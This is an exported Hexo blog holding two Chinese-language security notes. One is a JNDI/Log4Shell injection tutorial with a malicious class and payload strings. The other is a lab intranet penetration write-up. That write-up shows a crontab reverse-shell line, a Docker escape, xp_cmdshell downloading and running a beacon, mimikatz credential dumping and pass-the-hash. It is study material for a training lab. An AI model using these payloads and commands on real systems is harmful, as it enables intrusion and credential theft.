{"meta":{"title":"Hexo","subtitle":"","description":"","author":"r1ngs","url":"https://0xr1ngs.github.io","root":"/"},"pages":[{"title":"文章归档","date":"2023-06-18T07:49:56.844Z","updated":"2023-06-18T07:49:56.844Z","comments":true,"path":"archive.html","permalink":"https://0xr1ngs.github.io/archive.html","excerpt":"","text":""}],"posts":[{"title":"Jndi注入","slug":"Java-Jndi","date":"2023-06-19T11:21:26.000Z","updated":"2023-06-19T12:19:12.055Z","comments":true,"path":"2023/06/19/Java-Jndi/","link":"","permalink":"https://0xr1ngs.github.io/2023/06/19/Java-Jndi/","excerpt":"","text":"JNDI注入JNDI全称为Java Naming and Directory Interface（Java命名和目录接口），是SUN公司提供的一种标准的Java命名系统接口 命名服务是一种简单的键值对绑定，可以通过键名检索值，RMI就是典型的命名服务 目录服务通常使用树状结构来组织信息，LDAP是典型的目录服务，Active Directory是LDAP在Windows上的实现，OpenLDAP 是在 Linux 上的实现 JNDI_RMI服务端： 123456789101112131415161718192021222324package org.RmiDemo;import java.rmi.Naming;import java.rmi.RemoteException;import java.rmi.registry.LocateRegistry;import java.rmi.server.UnicastRemoteObject;public class Server &#123; public static class RMIInstance extends UnicastRemoteObject implements IHello&#123; // 绑定到RMI的对象的类必须要继承自UnicastRemoteObject，并且要实现一个继承自java.rmi.Remote的接口 // 构造方法 protected RMIInstance() throws RemoteException &#123; &#125; // 实现接口 @Override public String sayHello(String name) throws RemoteException &#123; return &quot;hello, &quot; + name; &#125; &#125; public static void main(String[] args) throws Exception &#123; LocateRegistry.createRegistry(1099); RMIInstance rmiInstance = new RMIInstance(); Naming.bind(&quot;rmi://127.0.0.1/hello&quot;,rmiInstance); &#125;&#125; 接口： 123456789package org.RmiDemo;import java.rmi.Remote;import java.rmi.RemoteException;public interface IHello extends Remote &#123; // 必须抛出java.rmi.RemoteException异常 String sayHello(String name) throws RemoteException;&#125; 客户端： 12345678910111213141516171819202122package org.RmiDemo;import javax.naming.Context;import javax.naming.InitialContext;import java.util.Hashtable;public class Client &#123; public static void main(String[] args) throws Exception&#123; // JNDI环境变量 Hashtable&lt;String, String&gt; env = new Hashtable&lt;&gt;(); env.put(Context.INITIAL_CONTEXT_FACTORY, &quot;com.sun.jndi.rmi.registry.RegistryContextFactory&quot;); env.put(Context.PROVIDER_URL, &quot;rmi://127.0.0.1&quot;); // javax.naming.InitialContext上下文 Context initialContext = new InitialContext(env); Object obj = initialContext.lookup(&quot;hello&quot;); if (obj instanceof IHello)&#123; IHello myHello = (IHello) obj; // 强转为IHello实例，并且赋给IHello类型的引用变量 System.out.println(myHello.sayHello(&quot;world&quot;)); &#125; &#125;&#125; 动态协议转换:initialContext.lookup指定的参数可控 1234567891011121314151617package org.RmiDemo;import javax.naming.Context;import javax.naming.InitialContext;public class Client &#123; public static void main(String[] args) throws Exception&#123; // 不指定环境变量 Context initialContext = new InitialContext(); // 通过用户输入来动态识别调用的服务 Object obj = initialContext.lookup(&quot;rmi://127.0.0.1/hello&quot;); if (obj instanceof IHello)&#123; IHello myHello = (IHello) obj; // 强转为IHello实例，并且赋给IHello类型的引用变量 System.out.println(myHello.sayHello(&quot;world&quot;)); &#125; &#125;&#125; 则可以指定一个攻击者的rmi服务，实例化恶意类达成攻击。但是恶意类在服务器端并不存在，也就调用不了方法，因此需要Reference类。如果远程获取RMI服务上的对象为Reference类或者其子类，则在客户端获取到远程对象存根实例时，可以从其他服务器上加载class文件来进行实例化。 12345678910// Constructs a new reference for an object with class name &#x27;className&#x27;, and the class name and location of the object&#x27;s factory.// Params:// className – The non-null class name of the object to which this reference refers. // factory – The possibly null class name of the object&#x27;s factory. // factoryLocation – The possibly null location from which to load the factory (e.g. URL)public Reference(String className, String factory, String factoryLocation) &#123; this(className); classFactory = factory; classFactoryLocation = factoryLocation;&#125; 1234567891011121314151617package org.RmiDemo;import java.rmi.Naming;import com.sun.jndi.rmi.registry.ReferenceWrapper;import javax.naming.Reference;import java.rmi.registry.LocateRegistry;public class Server &#123; public static void main(String[] args) throws Exception &#123; LocateRegistry.createRegistry(1099); Reference reference = new Reference(&quot;Arbitrary&quot;,&quot;Evil&quot;,&quot;&lt;http://127.0.0.1:8888/&gt;&quot;); // Reference没有继承UnicastRemoteObject，因此需要com.sun.jndi.rmi.registry.ReferenceWrapper进行包装 ReferenceWrapper refObjWrapper = new ReferenceWrapper(reference); Naming.bind(&quot;rmi://127.0.0.1/hello&quot;,refObjWrapper); System.out.println(&quot;Server Running.&quot;); &#125;&#125; 在这个例子中，factory是工厂类，会去直接寻找 http://127.0.0.1:8888/Evil.class文件，然后实例化，我们可以直接在工厂类的构造方法中执行代码，或者在静态代码块中执行。因此，className可以是任意的。 Class.forName(name)会执行”类的初始化“，先后调用static、{}、构造函数 123456789101112131415import java.io.IOException;public class Evil &#123; public Evil() throws IOException &#123; Runtime.getRuntime().exec(&quot;calc&quot;); &#125; static &#123; try &#123; Runtime.getRuntime().exec(&quot;calc&quot;); &#125; catch (IOException var1) &#123; throw new RuntimeException(var1); &#125; &#125;&#125; 然后用同版本（否则会报 Unsupported major.minor）jdk编译：javac [Evil.java](&lt;http://Evil.java&gt;) ，将其放入 http://127.0.0.1:8888 目录下，运行客户端代码即可弹出两次计算器（虽然会报 Evil cannot be cast to javax.naming.spi.ObjectFactory 但代码还是执行了）。 JDK 6u45、7u21之后：java.rmi.server.useCodebaseOnly的默认值被设置为true。当该值为true时，将禁用自动加载远程类文件，仅从CLASSPATH和当前JVM的java.rmi.server.codebase指定路径加载类文件。使用这个属性来防止客户端VM从其他Codebase地址上动态加载类，增加了RMI ClassLoader的安全性。 JDK 6u141、7u131、8u121之后：增加了com.sun.jndi.rmi.object.trustURLCodebase选项，默认为false，禁止RMI和CORBA协议使用远程codebase的选项，因此RMI和CORBA在以上的JDK版本上已经无法触发该漏洞，但依然可以通过指定URI为LDAP协议来进行JNDI注入攻击。 JDK 6u211、7u201、8u191之后：增加了com.sun.jndi.ldap.object.trustURLCodebase选项，默认为false，禁止LDAP协议使用远程codebase的选项，把LDAP协议的攻击途径也给禁了。 JdbcRowSetImpl通过JdbcRowSetImpl也能触发： 123456789101112package org.RmiDemo;import com.sun.rowset.JdbcRowSetImpl;public class Client &#123; public static void main(String[] args) throws Exception&#123; System.setProperty(&quot;com.sun.jndi.ldap.object.trustURLCodebase&quot;, &quot;true&quot;); JdbcRowSetImpl JdbcRowSetImpl_inc = new JdbcRowSetImpl(); JdbcRowSetImpl_inc.setDataSourceName(&quot;rmi://127.0.0.1/hello&quot;); JdbcRowSetImpl_inc.setAutoCommit(true); &#125;&#125; 触发点在setAutoCommit，参数是true还是false没有影响。 实验环境为 jdk 1.8.0_202，由于trustURLCodebase为false，如果不手动开启的话会报错：Exception in thread &quot;main&quot; java.lang.ClassCastException: javax.naming.Reference cannot be cast to javax.sql.DataSource 快速搭建JNDI环境： https://github.com/welk1n/JNDI-Injection-Exploit https://github.com/mbechler/marshalsec 8u191以后可以通过加载本地危险工厂类实现代码执行 https://github.com/veracode-research/rogue-jndi Log4shell可以用Springboot启动一个环境，maven依赖如下配置 1234567891011121314151617181920212223&lt;dependencies&gt; &lt;dependency&gt; &lt;groupId&gt;org.springframework.boot&lt;/groupId&gt; &lt;artifactId&gt;spring-boot-starter-web&lt;/artifactId&gt; &lt;exclusions&gt; &lt;!--先排除...--&gt; &lt;exclusion&gt; &lt;groupId&gt;org.apache.logging.log4j&lt;/groupId&gt; &lt;artifactId&gt;log4j-to-slf4j&lt;/artifactId&gt; &lt;/exclusion&gt; &lt;/exclusions&gt; &lt;/dependency&gt; &lt;dependency&gt; &lt;groupId&gt;org.apache.logging.log4j&lt;/groupId&gt; &lt;artifactId&gt;log4j-api&lt;/artifactId&gt; &lt;version&gt;2.14.0&lt;/version&gt; &lt;/dependency&gt; &lt;dependency&gt; &lt;groupId&gt;org.apache.logging.log4j&lt;/groupId&gt; &lt;artifactId&gt;log4j-core&lt;/artifactId&gt; &lt;version&gt;2.14.0&lt;/version&gt; &lt;/dependency&gt;&lt;/dependencies&gt; 可以先测试是否能解析（高版本已经默认关闭解析）： 123Logger logger = LogManager.getLogger(BasicController.class);logger.error(&quot;name:&#123;&#125;&quot;, &quot;$&#123;java:runtime&#125;&quot;);logger.error(&quot;name:&#123;&#125;&quot;, &quot;$&#123;jndi:dns://d4b3766c.ipv6.1433.eu.org&#125;&quot;); 通过一个简单的controller测试： 12345678910111213141516@Controllerpublic class BasicController &#123; private static final Logger logger = LogManager.getLogger(BasicController.class); // &lt;http://127.0.0.1:8080/hello?name=lisi&gt; @RequestMapping(&quot;/hello&quot;) @ResponseBody public String hello(@RequestParam(name = &quot;name&quot;, defaultValue = &quot;unknown user&quot;) String name) &#123; logger.error(&quot;name: &quot; + name); return &quot;Hello &quot; + name; &#125;...//SpringDemoApplication.javaSystem.setProperty(&quot;com.sun.jndi.ldap.object.trustURLCodebase&quot;, &quot;true&quot;);SpringApplication.run(SpringDemoApplication.class, args); 访问http://127.0.0.1:8080/hello?name=%24{jndi%3Aldap%3A%2F%2F127.0.0.1%3A1389%2Fcuizgz}即可执行恶意命令。","categories":[],"tags":[{"name":"Java","slug":"Java","permalink":"https://0xr1ngs.github.io/tags/Java/"}]},{"title":"LGP_内网渗透","slug":"LGP-内网渗透","date":"2022-07-16T12:02:14.000Z","updated":"2023-06-27T12:13:24.070Z","comments":true,"path":"2022/07/16/LGP-内网渗透/","link":"","permalink":"https://0xr1ngs.github.io/2022/07/16/LGP-%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/","excerpt":"","text":"前言师兄搭建的一个学习环境，从SSRF到docker逃逸再到mssql和PTH移动，记录一下WP 外网跳板http://192.168.34.244/ 不能用http，能用file，但是过滤了www等，看不了index.php，可以用url编码绕过还可以用 /proc/self/cwd Linux proc &#x2F;proc是一种伪文件系统（也即虚拟文件系统），存储的是当前内核运行状态的一系列特殊文件，用户可以通过这些文件查看有关系统硬件及当前正在运行进程的信息，甚至可以通过更改其中某些文件来改变内核的运行状态。 /proc/self/cwd是一个软连接，指向用户目录，如果是web用户就指向web目录，也可以用来绕过，还比如 /proc/net/arp 深入理解linux系统下proc文件系统内容 - zhezhelin - 博客园 可以看 /etc/hosts 这台的ip是172.17.0.2，arp还能看到一个.0.1 web目录留了一个phpshell和root密码，可以直接查找匹配&#x2F;etc文件夹下的所有文件 grep -rn &quot;root&quot; * 在蚁剑的shell里面不能 su root,这样没法输密码，直接就会返回 Password: su: Authentication failure 可以弹一个 meterpreter，在 meterpreter里进入shell，然后用 su root，然后再以root权限执行 shell.elf,这样就可以获得一个root的 meterpreter docker 逃逸特权模式挂载用户目录 123fdisk -lmkdir /testmount /dev/sda1 /test 这样相当于把宿主机的根目录挂载到了 /test 可以通过 test进行文件读写。 但是不能直接去 test目录执行 /bin/bash 只能通过写入 ssh key或者 crontab的形式 但是注意，不能直接把反弹shell的命令写到任务里，而是应该写入一个sh文件 12*/1 * * * * /bin/bash -i &gt;&amp; /dev/tcp/192.168.33.116/12501 0&gt;&amp;1 ❌*/1 * * * * root bash /tmp/shell.sh ✅ 原因： 解决ubuntu crontab反弹shell失败的问题 简单来说就是 centos里面的 cron中执行的 shell环境是 /bin/sh，ubuntu中 /bin/sh这个软连接指向了 dash 。但是不执行 dash直接执行 /test/bin/bash也是不行的。因为没有用 chroot切换 /test为根目录，而且弹过来的也不是宿主机的 shell，因为这样相当于在原来基础上只是加了一个 /bin/bash而已 同时，如果前面的crontab任务有错，后面的应该也是不执行的，比如前一句忘了写执行的用户 /etc/crontab 和 /var/spool/cron区别：/var/spool/cron/这个目录是以账号来区分每个用户自己的执行计划，而 /etc/crontab系统执行计划，需要在五个*后面加上用户，比如上面没有写到 /etc/crontab没有加root就是错误的 然后现在通过反弹的shell再弹 meterpreter就有宿主机shell了 内网移动mssql123456789101112131415[+] NetInfo:[*]172.16.2.4 [-&gt;]MSSQL [-&gt;]172.16.2.4[+] NetInfo:[*]172.16.2.2 [-&gt;]outx-rivate-PC [-&gt;]172.16.2.2[+] NetInfo:[*]172.16.2.1 [-&gt;]DC [-&gt;]172.16.2.1[+] 172.16.2.1 MS17-010 (Windows Server 2012 R2 Datacenter 9600)[+] 172.16.2.2 MS17-010 (Windows 7 Professional 7601 Service Pack 1) 不拿17-010打了，打 mssql ，密码在web配置文件里有，但是这台mssql只连通 172.16.2.0网段，要反弹回来的话只能在跳板机做一个端口转发，跳板机做server，攻击机做client，payload反弹到server的 12001端口相当于反弹到了client的 12001端口，listener这样设置 172.16.2.12就是跳板机的一个网卡ip，攻击机的 frpc.ini 配置为 123456789101112[common]tls_enable = truetoken = qax_scuserver_addr = 192.168.34.244server_port = 7200[http_proxy]type = tcpremote_port =12001plugin=http_proxylocal_port =12001local_ip =127.0.0.1 然后不能用cs直接通过listener生成payload，然后mssql_exec执行，因为经过排查后发现这样生成的payload根本没有走http流量，可能是个cs的bug，所以只能生成exe文件然后下载执行。 其次，msf的mssql_exec模块如果返回有中文字符会直接报错，建议直接用navicat 跳板机有python3，起一个http.server就可以，然后下载到progamdata执行 12exec master..xp_cmdshell &quot;powershell Invoke-WebRequest &lt;http://172.16.2.12:12345/beacon.exe&gt; -OutFile C://programdata/beacon.exe&quot;exec master..xp_cmdshell &quot;C://programdata/beacon.exe&quot; 提权mssql是 nt/service权限，用 ms16-075一键提权，弹回新的shell，然后hashdump和mimikatz hashdump 安全账户管理器（SAM）是Windows XP、Windows Vista、Windows 7、8.1、10和11中的一个数据库文件，用于存储用户的密码。它可以用来验证本地和远程用户。从Windows 2000 SP4开始，活动目录（AD）对域用户的尝试登陆进行认证。SAM使用加密措施来防止未经认证的用户访问系统。 SAM数据库文件存储在C:\\Windows\\System32\\config中。该文件中的所有数据都是加密的。密码哈希值存储在HKEY_LOCAL_MACHINE&#x2F;SAM中。即使它存储在本地，任何系统用户在运行时都不能访问该文件。出于安全考虑，对SAM的访问有不同的权限。访问它需要HKLM&#x2F;SAM和SYSTEM的权限。 hashdump是pwdump工具的内存版本，但它不是将DLL加载到LSASS.exe，而是在进程中分配内存，注入原始汇编代码，通过CreateRemoteThread执行，然后从内存中读回捕获的哈希值。 hashdump返回的结果格式为： Username:RID:LM-HASH:NTLM-HASH cmd5支持NTLM解密 mimikatz Mimikatz是一个开源的应用程序，允许用户查看和保存认证凭证，如Kerberos门票。 本地安全授权服务器服务（LSASS）是微软Windows操作系统中的一个进程，负责执行系统的安全策略。它验证登录到Windows计算机或服务器的用户，处理密码变更，并创建访问令牌。 它还会向Windows安全日志写入内容。 Windows使用的lsass.exe文件位于%WINDIR%\\System32目录下，该文件的描述是本地安全授权进程。强行终止lsass.exe会导致系统失去对任何账户的访问权，包括NT AUTHORITY，促使机器重新启动。 深入分析Mimikatz：WDigest 大概原理就是将任意DLL载入LSASS PTH原理一台windows计算机要么属于一个工作组，要么属于一个域。工作组中的每一台计算机在网络中地位平等，是独立管理的个体。域的优点在于1）集中的统一账户、资源管理。2）工作站的有效配置和安全性严密控制（比如给所有机器统一发放补丁等）。当计算机数量比较多，大型企业中网络规模大，需要统一的管理和集中的身份验证，并且能够给用户提供方便的搜索和使用网络资源的方式就应该使用域。域用户信息保存在活动目录(AD)中。 域是Windows计算机网络的一种形式，其中所有用户帐户 、计算机、打印机和其他安全主体都在位于称为域控制器（DC）的一个或多个中央计算机集群上的中央数据库中注册。 身份验证在域控制器上进行， 在域中使用计算机的每个人都会收到一个唯一的用户帐户，然后可以为该帐户分配相应的该域内资源的访问权限。 从Windows Server 2003开始 ， Active Directory是负责维护该中央数据库的Windows组件。 内网渗透入门–域相关概念 AD 域服务简介（一）- 基于 LDAP 的 AD 域服务器搭建及其使用 浅探内网横向移动-Pass The Hash - 先知社区 自window vista之后没办法使用RID非500的本地管理员用户来进行Pass The Hash, 但是如果是域用户且该域用户属于本地Administrators组的成员也可以进行pass the hash 1234567shell net user /domain\\\\\\\\DC.outx.com 的用户帐户-------------------------------------------------------------------------------Administrator Guest krbtgt outx 命令成功完成。 其中，KRBTGT账户是一个本地默认账户，作为密钥分发中心（KDC）服务的一个服务账户。这个账户不能被删除，账户名称也不能被改变。KRBTGT账户不能在活动目录中启用。在创建域的时候会自动创建这个账户。 IPC$及利用1234567891011121314151617181920beacon&gt; net share[*] Tasked beacon to run net share on localhost[+] host called home, sent: 105058 bytes[+] received output:Shares at \\\\\\\\localhost: Share name Comment ---------- ------- ADMIN$ 远程管理 C$ 默认共享 IPC$ 远程 IPCpth .\\\\outx ecde4d7a314541d34854ec83c114634bshell dir \\\\\\\\dc\\\\c$#当访问softer计算机中名为it168的共享文件夹，用UNC表示就是\\\\\\\\softer\\\\it168；#如果是softer计算机的默认管理共享C$则用\\\\\\\\softer\\\\c$来表示。#如果继续：shell dir \\\\\\\\dc\\\\c$\\\\Users IPC$共享是由Windows服务器服务创建的。这个特殊共享的存在是为了允许后续的命名管道连接到服务器。服务器的命名管道是由内置的操作系统组件和安装在系统上的任何应用程序或服务创建的。当命名管道被创建时，该进程指定了与该管道相关的安全性。然后，它确保 只向指定的用户或组授予访问权 。 IPC$共享也被称为空会话连接。通过使用该会话，Windows允许匿名用户执行某些活动，如列举域账户和网络共享的名称。 net use：将一台计算机连接到共享资源，或将一台计算机从共享资源中断开，或显示有关计算机连接的信息。 12net use \\\\\\\\靶机ip地址\\\\ipc$ &quot;密码&quot; /user:&quot;用户名&quot;net use 然后可以通过这个链接上传文件等等，比如 copy user.bat \\\\\\\\192.168.1.108\\\\c$ IPC$入侵大全 CS攻击在cs里，视图⇒目标⇒添加目标，添加DC，输入ip地址，然后psexec PsExec是一个轻量级的telnet替代软件，可以让你在其他系统上执行程序，为控制台应用程序提供完整的交互性，而不需要手动安装客户端软件。PsExec最强大的用途包括在远程系统上启动交互式命令程序和远程启用工具，如IpConfig，否则就不能显示远程系统的信息。 横向移动 - PsExec 的使用 直接就上线了，PC机也可以这么做","categories":[],"tags":[{"name":"内网渗透","slug":"内网渗透","permalink":"https://0xr1ngs.github.io/tags/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/"}]}],"categories":[],"tags":[{"name":"Java","slug":"Java","permalink":"https://0xr1ngs.github.io/tags/Java/"},{"name":"内网渗透","slug":"内网渗透","permalink":"https://0xr1ngs.github.io/tags/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/"}]}